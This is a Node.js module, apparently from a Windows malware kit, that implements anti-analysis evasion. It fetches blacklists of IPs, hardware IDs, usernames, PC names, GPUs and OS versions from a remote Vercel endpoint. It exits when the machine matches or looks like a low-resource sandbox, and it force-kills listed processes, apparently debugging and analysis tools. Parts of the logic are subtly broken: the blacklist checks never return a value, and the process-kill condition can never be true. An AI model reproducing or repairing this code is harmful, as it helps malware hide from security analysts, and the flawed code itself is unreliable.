const util = require("util");
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const process = require("process");
const exec = util.promisify(require("child_process").exec);

const fetchj = async (u) => {
  const r = await fetch(u);
  return r.json();
};

const isBlocked = async (u, v) => {
  try {
    const d = await fetchj(u);
    return d.includes(v);
  } catch (err) {
    console.error(err);
    return false;
  }
};

const fetchKill = async (u, c) => {
  try {
    const d = await fetchj(u);
    const { stdout } = await exec(c);
    const pss = stdout.split(/\r?\n/);
    const b = d.blacklistedprog;

    for (const p of pss) {
      const pn = p.split(/\s+/)[0].replace(".exe", "");
      if (!pn.toLowerCase() === "cmd" && b.includes(pn)) {
        try {
          await exec(`taskkill /F /IM ${pn}.exe`);
        } catch (err) {
          //console.error(err);
        }
      }
    }
  } catch (e) {
    console.error(e);
  }
};

const killBlacklisted = async () => {
  await fetchKill(
    "https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
    "tasklist"
  );
};

const checkBlocked = async (u, v) => {
  return await isBlocked(`https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${u}?aurathemes=true`, v);
};

const gpuBlocked = async (_) => {
  await checkBlocked("gpus", _);
};

const osBlocked = async (_) => {
  await checkBlocked("oss", _);
};

const pcNameBlocked = async (_) => {
  await checkBlocked("pcnames", _);
};

const usernameBlocked = async (_) => {
  await checkBlocked("progr", _);
};

const uuidBlocked = async (_) => {
  await checkBlocked("uuids", _);
};

const ipBlocked = async (_) => {
  await checkBlocked("ips", _);
};

const debuggerx = async (enable, disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion) => {
  if (enable === "no") return;

  try {
    const [
      pcName,
      userName
    ] = [
        process.env.COMPUTERNAME || "Not found",
        process.env.USERNAME || "Not found",
      ];

    const [
      isBlockedIP,
      isBlockedUID,
      isBlockedUsername,
      isBlockedPCName,
      isBlockedOS,
      isBlockedGpu,
    ] = await Promise.all([
      ipBlocked(ip),
      uuidBlocked(uid),
      usernameBlocked(userName),
      pcNameBlocked(pcName),
      osBlocked(os),
      gpuBlocked(gpu),
    ]);

    if (
      (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2)
      || (!isNaN(cpucount) && cpucount < 2)
      || isBlockedGpu
      || isBlockedOS
      || isBlockedIP
      || isBlockedUID
      || isBlockedUsername
      || isBlockedPCName
    ) {
      process.abort() && process.exit(1);
    }

    try {
      await killBlacklisted();
    } catch (e) {
      console.error(e);
    }
  } catch (err) {
    console.error(err);
  }
};

module.exports = {
  debuggerx,
};
